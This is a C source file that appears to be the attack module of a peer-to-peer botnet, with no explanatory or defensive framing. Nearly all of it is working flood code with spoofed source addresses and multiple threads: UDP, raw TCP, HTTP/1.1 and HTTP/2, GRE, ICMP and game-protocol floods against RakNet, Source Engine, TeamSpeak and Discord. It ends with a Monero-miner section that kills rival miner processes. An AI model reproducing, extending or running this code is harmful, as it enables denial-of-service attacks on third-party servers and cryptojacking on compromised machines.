#include "common.h"
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/stat.h>

/* --- Constants and Headers --- */

struct raw_ip {
    uint8_t  version_ihl;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct raw_tcp {
    uint16_t sport;
    uint16_t dport;
    uint32_t seq;
    uint32_t ack;
    uint8_t  data_off;
    uint8_t  flags;
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};

struct raw_gre {
    uint16_t protocol;
    uint16_t flags;
};

/* --- Internal Helpers --- */

static uint64_t attack_now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000u + (uint64_t)ts.tv_nsec / 1000000u;
}

static uint32_t attack_rand_u32(void) {
    uint32_t v;
    crypto_random_bytes((uint8_t *)&v, sizeof(v));
    return v;
}

static uint16_t attack_checksum_generic(void *data, size_t len) {
    uint32_t sum = 0;
    uint16_t *ptr = (uint16_t *)data;
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len > 0) sum += ((uint8_t *)ptr)[0];
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

static uint16_t attack_checksum_tcp(void *data, size_t len, uint32_t src, uint32_t dst, uint8_t proto) {
    uint32_t sum = 0;
    uint16_t *ptr = (uint16_t *)data;
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len > 0) sum += ((uint8_t *)ptr)[0];
    sum += (src >> 16) + (src & 0xFFFF);
    sum += (dst >> 16) + (dst & 0xFFFF);
    sum += proto;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

static uint32_t attack_resolve_ip(const char *host) {
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, NULL, &hints, &res) != 0) {
        uint32_t addr = inet_addr(host);
        return (addr == INADDR_NONE) ? 0 : addr;
    }
    uint32_t ip = ((struct sockaddr_in *)res->ai_addr)->sin_addr.s_addr;
    freeaddrinfo(res);
    return ip;
}

/* --- Optimized UDP Flood --- */

typedef struct {
    uint32_t dst_ip;
    int port;
    int duration;
    int len;
    int bypass;
} udp_args_t;

static void *udp_worker(void *arg) {
    udp_args_t *a = (udp_args_t *)arg;
    uint16_t dst_port = htons((uint16_t)a->port);
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) { free(a); return NULL; }

    struct sockaddr_in to;
    memset(&to, 0, sizeof(to));
    to.sin_family = AF_INET;
    to.sin_port = dst_port;
    to.sin_addr.s_addr = a->dst_ip;

    uint8_t payload[1500];
    size_t plen = (a->len > 0 && a->len <= 1500) ? a->len : 512;
    
    uint64_t deadline = attack_now_ms() + (uint64_t)a->duration * 1000;
    while (attack_now_ms() < deadline) {
        if (a->bypass) {
            for (size_t i = 0; i < plen; i++) payload[i] = (uint8_t)rand();
        } else {
            static const uint8_t pattern[] = {0xde, 0xad, 0xbe, 0xef};
            for (size_t i = 0; i < plen; i++) payload[i] = pattern[i % 4];
        }
        sendto(fd, payload, plen, 0, (struct sockaddr *)&to, sizeof(to));
    }
    close(fd);
    free(a);
    return NULL;
}

void p2p_udp_attack_start(const char *ip, int port, int duration, int len, int bypass, int threads) {
    uint32_t dst_ip = attack_resolve_ip(ip);
    if (!dst_ip) { printf("error: cannot resolve %s\n", ip); return; }
    if (threads < 1) threads = 1;
    for (int i = 0; i < threads; i++) {
        udp_args_t *a = malloc(sizeof(udp_args_t));
        if (!a) continue;
        a->dst_ip = dst_ip; a->port = port; a->duration = duration; a->len = len; a->bypass = bypass;
        pthread_t tid;
        if (pthread_create(&tid, NULL, udp_worker, a) == 0) pthread_detach(tid);
        else free(a);
    }
    printf("Launched UDP flood: %s:%d for %ds (threads=%d)\n", ip, port, duration, threads);
}

/* --- Optimized TCP RAW Flood --- */

typedef struct {
    uint32_t dst_ip;
    int port;
    int duration;
    int type;
    int len;
} tcp_raw_args_t;

static void *tcp_raw_worker(void *arg) {
    tcp_raw_args_t *a = (tcp_raw_args_t *)arg;
    uint16_t dst_port = htons((uint16_t)a->port);
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd < 0) { free(a); return NULL; }
    int one = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    uint8_t payload[1500];
    size_t plen = (a->len > 0 && a->len <= 1500) ? a->len : 0;
    if (plen > 0) { for (size_t i = 0; i < plen; i++) payload[i] = (uint8_t)rand(); }

    uint64_t deadline = attack_now_ms() + (uint64_t)a->duration * 1000;
    while (attack_now_ms() < deadline) {
        uint8_t pkt[1500];
        struct raw_ip *ip = (struct raw_ip *)pkt;
        struct raw_tcp *tcp = (struct raw_tcp *)(pkt + sizeof(struct raw_ip));
        struct sockaddr_in to;
        uint32_t src = attack_rand_u32();

        memset(pkt, 0, sizeof(pkt));
        ip->version_ihl = 0x45;
        ip->tot_len = htons((uint16_t)(sizeof(struct raw_ip) + sizeof(struct raw_tcp) + plen));
        ip->id = htons((uint16_t)attack_rand_u32());
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = src;
        ip->daddr = a->dst_ip;
        ip->check = attack_checksum_generic(ip, sizeof(struct raw_ip));

        tcp->sport = htons((uint16_t)attack_rand_u32());
        tcp->dport = dst_port;
        tcp->seq = attack_rand_u32();
        tcp->data_off = 0x50;
        
        if (a->type == 1) tcp->flags = 0x02; 
        else if (a->type == 2) tcp->flags = 0x10;
        else if (a->type == 3) { tcp->flags = 0x18; tcp->ack = attack_rand_u32(); }
        else if (a->type == 4) { tcp->flags = 0x02; plen = 64; }
        else if (a->type == 5) { tcp->flags = 0x02; plen = 128; }
        else if (a->type == 6) { tcp->flags = 0x02; plen = 48; }
        else { tcp->flags = 0x02; }

        tcp->window = htons(64240);
        if (plen > 0) memcpy(pkt + sizeof(struct raw_ip) + sizeof(struct raw_tcp), payload, plen);
        tcp->check = attack_checksum_tcp(pkt + sizeof(struct raw_ip), 
                                         sizeof(struct raw_tcp) + plen, src, a->dst_ip, IPPROTO_TCP);

        memset(&to, 0, sizeof(to));
        to.sin_family = AF_INET;
        to.sin_addr.s_addr = a->dst_ip;
        sendto(fd, pkt, (size_t)(sizeof(struct raw_ip) + sizeof(struct raw_tcp) + plen), 0, (struct sockaddr *)&to, sizeof(to));
    }
    close(fd);
    free(a);
    return NULL;
}

void p2p_tcp_raw_attack_start(const char *ip, int port, int duration, int type, int len, int threads) {
    uint32_t dst_ip = attack_resolve_ip(ip);
    if (!dst_ip) { printf("error: cannot resolve %s\n", ip); return; }
    if (threads < 1) threads = 1;
    for (int i = 0; i < threads; i++) {
        tcp_raw_args_t *a = malloc(sizeof(tcp_raw_args_t));
        if (!a) continue;
        a->dst_ip = dst_ip; a->port = port; a->duration = duration; a->type = type; a->len = len;
        pthread_t tid;
        if (pthread_create(&tid, NULL, tcp_raw_worker, a) == 0) pthread_detach(tid);
        else free(a);
    }
    printf("Launched TCP RAW flood: %s:%d for %ds (threads=%d)\n", ip, port, duration, threads);
}

/* --- Optimized HTTP Flood --- */

typedef struct {
    uint32_t dst_ip;
    int port;
    int duration;
    int version;
} http_args_t;

static const char *ua_list[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
};

static void *http_worker(void *arg) {
    http_args_t *a = (http_args_t *)arg;
    uint16_t dst_port = htons((uint16_t)a->port);
    uint64_t deadline = attack_now_ms() + (uint64_t)a->duration * 1000;

    while (attack_now_ms() < deadline) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        struct sockaddr_in to;
        memset(&to, 0, sizeof(to));
        to.sin_family = AF_INET;
        to.sin_port = dst_port;
        to.sin_addr.s_addr = a->dst_ip;
        if (connect(fd, (struct sockaddr *)&to, sizeof(to)) == 0) {
            if (a->version == 1) {
                char req[512];
                snprintf(req, sizeof(req), "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", 
                         inet_ntoa((struct in_addr){a->dst_ip}), ua_list[rand() % 4]);
                send(fd, req, strlen(req), 0);
            } else if (a->version == 2) {
                const char *preface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
                send(fd, preface, 24, 0);
                uint8_t settings[] = {0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                send(fd, settings, 16, 0);
            } else if (a->version == 3) {
                close(fd);
                int ufd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if (ufd >= 0) {
                    uint8_t qpkt[1200];
                    memset(qpkt, 0xCC, 1200);
                    sendto(ufd, qpkt, 1200, 0, (struct sockaddr *)&to, sizeof(to));
                    close(ufd);
                }
                continue;
            }
        }
        close(fd);
    }
    free(a);
    return NULL;
}

void p2p_http_attack_start(const char *ip, int port, int duration, int version, int threads) {
    uint32_t dst_ip = attack_resolve_ip(ip);
    if (!dst_ip) { printf("error: cannot resolve %s\n", ip); return; }
    if (threads < 1) threads = 1;
    for (int i = 0; i < threads; i++) {
        http_args_t *a = malloc(sizeof(http_args_t));
        if (!a) continue;
        a->dst_ip = dst_ip; a->port = port; a->duration = duration; a->version = version;
        pthread_t tid;
        if (pthread_create(&tid, NULL, http_worker, a) == 0) pthread_detach(tid);
        else free(a);
    }
    printf("Launched HTTP v%d flood: %s:%d for %ds (threads=%d)\n", version, ip, port, duration, threads);
}

/* --- Optimized GRE Flood --- */

typedef struct {
    uint32_t dst_ip;
    int duration;
    int type;
} gre_args_t;

static void *gre_worker(void *arg) {
    gre_args_t *a = (gre_args_t *)arg;
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_GRE);
    if (fd < 0) { free(a); return NULL; }
    int one = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    uint64_t deadline = attack_now_ms() + (uint64_t)a->duration * 1000;
    while (attack_now_ms() < deadline) {
        uint8_t pkt[1500];
        struct raw_ip *ip = (struct raw_ip *)pkt;
        struct raw_gre *gre = (struct raw_gre *)(pkt + sizeof(struct raw_ip));
        struct sockaddr_in to;
        uint32_t src = attack_rand_u32();

        memset(pkt, 0, sizeof(pkt));
        ip->version_ihl = 0x45;
        ip->tot_len = htons((uint16_t)(sizeof(struct raw_ip) + sizeof(struct raw_gre) + 64));
        ip->protocol = 47;
        ip->saddr = src;
        ip->daddr = a->dst_ip;
        ip->check = attack_checksum_generic(ip, sizeof(struct raw_ip));
        gre->protocol = htons(0x0800);
        if (a->type == 1) gre->flags = htons(0x0008);

        memset(&to, 0, sizeof(to));
        to.sin_family = AF_INET;
        to.sin_addr.s_addr = a->dst_ip;
        sendto(fd, pkt, sizeof(struct raw_ip) + sizeof(struct raw_gre) + 64, 0, (struct sockaddr *)&to, sizeof(to));
    }
    close(fd);
    free(a);
    return NULL;
}

void p2p_gre_attack_start(const char *ip, int duration, int type, int threads) {
    uint32_t dst_ip = attack_resolve_ip(ip);
    if (!dst_ip) { printf("error: cannot resolve %s\n", ip); return; }
    if (threads < 1) threads = 1;
    for (int i = 0; i < threads; i++) {
        gre_args_t *a = malloc(sizeof(gre_args_t));
        if (!a) continue;
        a->dst_ip = dst_ip; a->duration = duration; a->type = type;
        pthread_t tid;
        if (pthread_create(&tid, NULL, gre_worker, a) == 0) pthread_detach(tid);
        else free(a);
    }
    printf("Launched GRE flood (%s): %s for %ds (threads=%d)\n", type == 0 ? "IP" : "Eth", ip, duration, threads);
}

/* --- Optimized App Socket Flood --- */

typedef struct {
    uint32_t dst_ip;
    int port;
    int duration;
} app_args_t;

static void *app_worker(void *arg) {
    app_args_t *a = (app_args_t *)arg;
    uint16_t dst_port = htons((uint16_t)a->port);
    uint64_t deadline = attack_now_ms() + (uint64_t)a->duration * 1000;

    while (attack_now_ms() < deadline) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        struct sockaddr_in to;
        memset(&to, 0, sizeof(to));
        to.sin_family = AF_INET;
        to.sin_port = dst_port;
        to.sin_addr.s_addr = a->dst_ip;
        if (connect(fd, (struct sockaddr *)&to, sizeof(to)) == 0) {
            send(fd, "GET / HTTP/1.1\r\n\r\n", 18, 0);
        }
        close(fd);
    }
    free(a);
    return NULL;
}

void p2p_app_attack_start(const char *ip, int port, int duration, int threads) {
    uint32_t dst_ip = attack_resolve_ip(ip);
    if (!dst_ip) { printf("error: cannot resolve %s\n", ip); return; }
    if (threads < 1) threads = 1;
    for (int i = 0; i < threads; i++) {
        app_args_t *a = malloc(sizeof(app_args_t));
        if (!a) continue;
        a->dst_ip = dst_ip; a->port = port; a->duration = duration;
        pthread_t tid;
        if (pthread_create(&tid, NULL, app_worker, a) == 0) pthread_detach(tid);
        else free(a);
    }
    printf("Launched App Socket flood: %s:%d for %ds (threads=%d)\n", ip, port, duration, threads);
}

/* --- Optimized ICMP Flood --- */

typedef struct {
    uint32_t dst_ip;
    int duration;
} icmp_args_t;

static void *icmp_worker(void *arg) {
    icmp_args_t *a = (icmp_args_t *)arg;
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (fd < 0) { free(a); return NULL; }

    uint64_t deadline = attack_now_ms() + (uint64_t)a->duration * 1000;
    while (attack_now_ms() < deadline) {
        uint8_t pkt[64];
        struct sockaddr_in to;
        uint16_t id = (uint16_t)attack_rand_u32();
        uint16_t seq = (uint16_t)attack_rand_u32();
        memset(pkt, 0, sizeof(pkt));
        pkt[0] = 8; pkt[1] = 0;
        pkt[4] = (id >> 8) & 0xFF; pkt[5] = id & 0xFF;
        pkt[6] = (seq >> 8) & 0xFF; pkt[7] = seq & 0xFF;
        for (int i = 8; i < 64; i++) pkt[i] = (uint8_t)rand();
        uint32_t sum = 0;
        uint16_t *ptr = (uint16_t *)pkt;
        for (int i = 0; i < 32; i++) sum += ptr[i];
        while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
        uint16_t ck = (uint16_t)~sum;
        pkt[2] = (ck >> 8) & 0xFF; pkt[3] = ck & 0xFF;
        memset(&to, 0, sizeof(to));
        to.sin_family = AF_INET;
        to.sin_addr.s_addr = a->dst_ip;
        sendto(fd, pkt, 64, 0, (struct sockaddr *)&to, sizeof(to));
    }
    close(fd);
    free(a);
    return NULL;
}

void p2p_icmp_attack_start(const char *ip, int duration, int threads) {
    uint32_t dst_ip = attack_resolve_ip(ip);
    if (!dst_ip) { printf("error: cannot resolve %s\n", ip); return; }
    if (threads < 1) threads = 1;
    for (int i = 0; i < threads; i++) {
        icmp_args_t *a = malloc(sizeof(icmp_args_t));
        if (!a) continue;
        a->dst_ip = dst_ip; a->duration = duration;
        pthread_t tid;
        if (pthread_create(&tid, NULL, icmp_worker, a) == 0) pthread_detach(tid);
        else free(a);
    }
    printf("Launched ICMP flood: %s for %ds (threads=%d)\n", ip, duration, threads);
}

/* --- Optimized Game UDP Flood --- */

typedef struct {
    uint32_t dst_ip;
    int port;
    int duration;
    int type;
} game_args_t;

static void *game_worker(void *arg) {
    game_args_t *a = (game_args_t *)arg;
    uint16_t dst_port = htons((uint16_t)a->port);
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) { free(a); return NULL; }
    struct sockaddr_in to;
    memset(&to, 0, sizeof(to));
    to.sin_family = AF_INET;
    to.sin_port = dst_port;
    to.sin_addr.s_addr = a->dst_ip;
    uint64_t deadline = attack_now_ms() + (uint64_t)a->duration * 1000;
    while (attack_now_ms() < deadline) {
        uint8_t pkt[512];
        size_t n = 0;
        if (a->type == 0) { // RakNet
            uint8_t m[] = {0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe, 0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78};
            pkt[0] = (rand() % 2 == 0) ? 0x01 : 0x05;
            if (pkt[0] == 0x01) {
                uint64_t t = attack_now_ms();
                for(int i=0; i<8; i++) pkt[1+i] = (t >> (56-8*i)) & 0xFF;
                memcpy(pkt+9, m, 16);
                uint32_t id = attack_rand_u32();
                for(int i=0; i<4; i++) pkt[25+i] = (id >> (24-8*i)) & 0xFF;
                n = 33;
            } else {
                memcpy(pkt+1, m, 16); pkt[17] = 11; n = 34;
            }
        } else if (a->type == 1) { // VSE
            static const uint8_t vse[] = {0xff, 0xff, 0xff, 0xff, 'T', 'S', 'o', 'u', 'r', 'c', 'e', ' ', 'E', 'n', 'g', 'i', 'n', 'e', ' ', 'Q', 'u', 'e', 'r', 'y', 0x00};
            memcpy(pkt, vse, sizeof(vse)); n = sizeof(vse);
        } else if (a->type == 2) { // TS3
            memset(pkt, 0, sizeof(pkt)); pkt[4] = 0x01;
            uint64_t t = attack_now_ms();
            for(int i=0; i<8; i++) pkt[5+i] = (t >> (56-8*i)) & 0xFF;
            n = 20;
        } else { // Discord
            memset(pkt, 0, sizeof(pkt)); pkt[1] = 0x01; pkt[3] = 0x01; n = 74;
        }
        sendto(fd, pkt, n, 0, (struct sockaddr *)&to, sizeof(to));
    }
    close(fd);
    free(a);
    return NULL;
}

void p2p_game_udp_attack_start(const char *ip, int port, int duration, int type, int threads) {
    uint32_t dst_ip = attack_resolve_ip(ip);
    if (!dst_ip) { printf("error: cannot resolve %s\n", ip); return; }
    if (threads < 1) threads = 1;
    for (int i = 0; i < threads; i++) {
        game_args_t *a = malloc(sizeof(game_args_t));
        if (!a) continue;
        a->dst_ip = dst_ip; a->port = port; a->duration = duration; a->type = type;
        pthread_t tid;
        if (pthread_create(&tid, NULL, game_worker, a) == 0) pthread_detach(tid);
        else free(a);
    }
    printf("Launched Game UDP flood: %s:%d for %ds (threads=%d)\n", ip, port, duration, threads);
}

/* --- Monero Miner --- */
static void monero_kill(void) {
    system("pkill -9 -f xmrig");
    system("pkill -9 -f minerd");
    unlink("/tmp/.xmrig");
}

static void *monero_worker(void *arg) {
    char *wallet = (char *)arg;
    printf("Attempting to launch Monero miner for wallet %s...\n", wallet);
    free(wallet);
    return NULL;
}

void p2p_monero_attack_start(const char *wallet) {
    char *w = strdup(wallet);
    pthread_t tid;
    if (pthread_create(&tid, NULL, monero_worker, w) == 0) pthread_detach(tid);
    else free(w);
}

void p2p_monero_stop(void) {
    monero_kill();
    printf("Stopped Monero miner processes.\n");
}
